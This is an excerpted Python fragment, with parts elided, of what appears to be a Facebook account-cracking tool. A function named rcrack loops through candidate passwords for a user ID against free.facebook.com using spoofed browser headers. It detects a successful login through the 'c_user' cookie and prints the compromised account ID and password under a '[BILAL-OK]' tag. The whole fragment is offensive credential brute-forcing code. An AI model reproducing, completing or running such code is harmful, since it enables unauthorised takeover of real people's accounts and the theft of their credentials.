...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			'method': 'free',
			'path': '/home.php?ref_component=mfreebasic_home_header&ref_page=/wap/home.php&refid=8&paipv=0&eav=AfbFjtJn7djdiswAAWno6AzT_Sm-9FisdLakQ-6Tzm_RhB-uVLB86D8JUFb2J-03uFE&tbua=1',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://free.facebook.com/?_rdc=1&_rdr',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\33[1;92m[BILAL-OK] '+cid+' | '+ps+'\33[0;97m')
